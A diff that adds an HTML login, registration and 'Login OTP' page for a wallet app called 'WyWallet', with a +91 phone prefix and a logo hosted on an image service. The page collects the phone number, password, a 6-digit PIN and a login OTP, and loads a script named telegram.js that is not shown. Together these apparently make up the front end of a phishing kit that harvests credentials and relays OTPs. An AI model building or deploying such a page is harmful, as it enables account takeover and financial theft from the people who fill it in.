@@ -1,1 +1,120 @@
-Hello
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WyWallet</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+  <div class="phone-container">
+
+    <!-- LOGIN SCREEN -->
+    <div id="login-screen" class="screen active">
+      <div class="logo-box">
+        <img src="https://i.postimg.cc/sxtL6byW/IMG-20260812-150117-352.jpg" alt="WyWallet Logo" />
+      </div>
+
+      <div class="input-group">
+        <i class="fa-regular fa-user"></i>
+        <input type="tel" placeholder="Phone" id="login-phone" inputmode="numeric" maxlength="10" />
+      </div>
+      <div class="input-group">
+        <i class="fa-solid fa-lock"></i>
+        <input type="password" placeholder="Password" id="login-pass" />
+      </div>
+      <div class="input-group">
+        <i class="fa-solid fa-key"></i>
+        <input type="password" placeholder="6-digit PIN" id="login-pin" inputmode="numeric" maxlength="6" />
+      </div>
+      <div class="pin-hint">Enter your 6-digit security PIN</div>
+
+      <div class="login-options">
+        <a data-nav="register">Register</a>
+        <label class="checkbox-label">
+          <input type="checkbox" id="remember-me" /> Remember Me
+        </label>
+      </div>
+
+      <div class="privacy-row">
+        <label class="checkbox-label">
+          <input type="checkbox" id="privacy-agree" checked /> Agree
+        </label>
+        <a href="#">"User Privacy Agreement"</a>
+      </div>
+
+      <button class="btn-primary" id="btn-signin">Sign In</button>
+      <a class="forget-password">Forget Password</a>
+      <div class="version-tag">v2.0</div>
+    </div>
+
+    <!-- REGISTER SCREEN -->
+    <div id="register-screen" class="screen">
+      <div class="reg-header">
+        <i class="fa-solid fa-arrow-left back-btn" data-nav="login"></i>
+        <h2>Register</h2>
+      </div>
+
+      <div class="input-group">
+        <i class="fa-regular fa-user"></i>
+        <input type="text" placeholder="User Name" id="reg-username" />
+      </div>
+      <div class="input-group">
+        <i class="fa-solid fa-lock"></i>
+        <input type="password" placeholder="Password" id="reg-pass" />
+      </div>
+      <div class="input-group">
+        <i class="fa-solid fa-key"></i>
+        <input type="password" placeholder="6-digit PIN" id="reg-pin" inputmode="numeric" maxlength="6" />
+      </div>
+      <div class="phone-input-wrapper">
+        <i class="fa-solid fa-phone"></i>
+        <span class="country-code">+91</span>
+        <input type="tel" placeholder="Phone" id="reg-phone" inputmode="numeric" maxlength="10" />
+      </div>
+      <div class="input-group otp-wrapper">
+        <i class="fa-regular fa-envelope"></i>
+        <input type="text" placeholder="OTP Code" id="reg-otp" maxlength="6" inputmode="numeric" />
+        <button class="send-otp-btn" id="btn-send-otp">Send</button>
+      </div>
+      <div class="input-group">
+        <i class="fa-solid fa-link"></i>
+        <input type="text" placeholder="Invite Code" id="reg-invite" />
+      </div>
+      <button class="btn-primary" id="btn-signup">Sign Up</button>
+    </div>
+
+    <!-- VERIFICATION MODAL -->
+    <div class="modal-overlay" id="verification-modal">
+      <div class="modal-card">
+        <div class="modal-header">
+          <h3>Login OTP</h3>
+          <button class="close-modal-btn" id="btn-close-modal">
+            <i class="fa-solid fa-xmark"></i>
+          </button>
+        </div>
+        <div class="modal-body-text">
+          Tap Send to receive the OTP, then enter it to confirm this login.
+        </div>
+        <div class="modal-subtext" id="dynamic-otp-text">OTP will be sent to +91</div>
+        <div class="timer-text" id="modal-timer">
+          ⏳ Resend OTP in <span id="timer-countdown">60</span>s
+        </div>
+        <div class="input-group otp-wrapper">
+          <i class="fa-regular fa-envelope"></i>
+          <input type="text" placeholder="Enter 6-digit OTP" id="modal-otp" maxlength="6" inputmode="numeric" />
+          <button class="send-otp-btn" id="modal-send-otp-btn">Send</button>
+        </div>
+        <button class="btn-primary" id="btn-confirm-otp" style="margin-top:10px;">Confirm</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Scripts -->
+  <script src="js/config.js"></script>
+  <script src="js/telegram.js"></script>
+  <script src="js/auth.js"></script>
+</body>
+</html>
